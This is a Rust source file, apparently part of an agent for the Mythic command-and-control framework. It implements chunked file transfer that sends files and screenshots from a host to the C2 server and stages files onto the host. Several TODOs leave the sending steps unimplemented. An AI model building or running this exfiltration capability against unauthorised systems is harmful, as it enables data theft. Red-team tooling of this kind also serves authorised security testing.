use crate::structs::{
    FileDownloadMessage, FileUploadMessageResponse, GetFileFromMythicStruct, Response,
    SendFileToMythicStruct,
};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde_json::Value;
use tokio::sync::mpsc;

pub const FILE_CHUNK_SIZE: usize = 512_000;

lazy_static::lazy_static! {
    /// Channel for tasks to request sending a file to Mythic ("download" from Mythic's perspective)
    pub static ref SEND_TO_MYTHIC_TX: mpsc::Sender<SendFileToMythicStruct> = {
        let (tx, rx) = mpsc::channel(10);
        tokio::spawn(listen_for_send_file_to_mythic(rx));
        tx
    };

    /// Channel for tasks to request getting a file from Mythic ("upload" from Mythic's perspective)
    pub static ref GET_FROM_MYTHIC_TX: mpsc::Sender<GetFileFromMythicStruct> = {
        let (tx, rx) = mpsc::channel(10);
        tokio::spawn(listen_for_get_from_mythic(rx));
        tx
    };
}

/// Initialize file transfer channels
pub fn initialize() -> (
    mpsc::Sender<SendFileToMythicStruct>,
    mpsc::Sender<GetFileFromMythicStruct>,
) {
    let (send_tx, send_rx) = mpsc::channel::<SendFileToMythicStruct>(10);
    let (get_tx, get_rx) = mpsc::channel::<GetFileFromMythicStruct>(10);

    tokio::spawn(listen_for_send_file_to_mythic(send_rx));
    tokio::spawn(listen_for_get_from_mythic(get_rx));

    (send_tx, get_tx)
}

/// Listen for file upload (download) requests from tasks
async fn listen_for_send_file_to_mythic(mut rx: mpsc::Receiver<SendFileToMythicStruct>) {
    while let Some(mut msg) = rx.recv().await {
        tokio::spawn(async move {
            handle_send_file_to_mythic(&mut msg).await;
        });
    }
}

/// Handle sending a file to Mythic in chunks
async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
    let data = match &msg.data {
        Some(d) => d.clone(),
        None => {
            utils::print_debug("No data provided for file transfer");
            return;
        }
    };

    let total_chunks = std::cmp::max(1, (data.len() + FILE_CHUNK_SIZE - 1) / FILE_CHUNK_SIZE);

    // Generate tracking UUID
    msg.tracking_uuid = uuid::Uuid::new_v4().to_string();

    // Send initial registration (chunk 0)
    let initial_response = Response {
        task_id: msg.task_id.clone(),
        tracking_uuid: Some(msg.tracking_uuid.clone()),
        download: Some(FileDownloadMessage {
            total_chunks: total_chunks as i32,
            chunk_num: 0,
            full_path: msg.full_path.clone(),
            filename: msg.file_name.clone(),
            chunk_data: String::new(),
            file_id: String::new(),
            is_screenshot: msg.is_screenshot,
        }),
        ..Response::default()
    };

    // TODO: Send initial_response through the response channel
    // and wait for file_id from Mythic before sending chunks
    utils::print_debug(&format!(
        "File transfer registered: {} chunks for {}",
        total_chunks, msg.file_name
    ));

    // Send each chunk
    for chunk_num in 1..=total_chunks {
        let start = (chunk_num - 1) * FILE_CHUNK_SIZE;
        let end = std::cmp::min(chunk_num * FILE_CHUNK_SIZE, data.len());
        let chunk_data = BASE64.encode(&data[start..end]);

        let chunk_response = Response {
            task_id: msg.task_id.clone(),
            tracking_uuid: Some(msg.tracking_uuid.clone()),
            download: Some(FileDownloadMessage {
                total_chunks: total_chunks as i32,
                chunk_num: chunk_num as i32,
                full_path: msg.full_path.clone(),
                filename: msg.file_name.clone(),
                chunk_data,
                file_id: String::new(), // Set from Mythic response
                is_screenshot: msg.is_screenshot,
            }),
            ..Response::default()
        };

        if msg.send_user_status_updates {
            utils::print_debug(&format!(
                "Sending chunk {}/{}",
                chunk_num, total_chunks
            ));
        }

        // TODO: send chunk_response and wait for acknowledgment
        let _ = chunk_response;
    }

    // Signal transfer complete
    let _ = msg.finished_transfer.send(1).await;
}

/// Listen for file download (upload) requests from tasks
async fn listen_for_get_from_mythic(mut rx: mpsc::Receiver<GetFileFromMythicStruct>) {
    while let Some(mut msg) = rx.recv().await {
        tokio::spawn(async move {
            handle_get_file_from_mythic(&mut msg).await;
        });
    }
}

/// Handle getting a file from Mythic in chunks
async fn handle_get_file_from_mythic(msg: &mut GetFileFromMythicStruct) {
    msg.tracking_uuid = uuid::Uuid::new_v4().to_string();

    // Request file from Mythic
    let initial_response = Response {
        task_id: msg.task_id.clone(),
        tracking_uuid: Some(msg.tracking_uuid.clone()),
        upload: Some(crate::structs::FileUploadMessage {
            chunk_size: FILE_CHUNK_SIZE as i32,
            total_chunks: 0,
            file_id: msg.file_id.clone(),
            chunk_num: 0,
            full_path: msg.full_path.clone(),
            chunk_data: String::new(),
        }),
        ..Response::default()
    };

    utils::print_debug(&format!(
        "Requesting file {} from Mythic",
        msg.file_id
    ));

    // TODO: Send request and receive chunks
    let _ = initial_response;
}
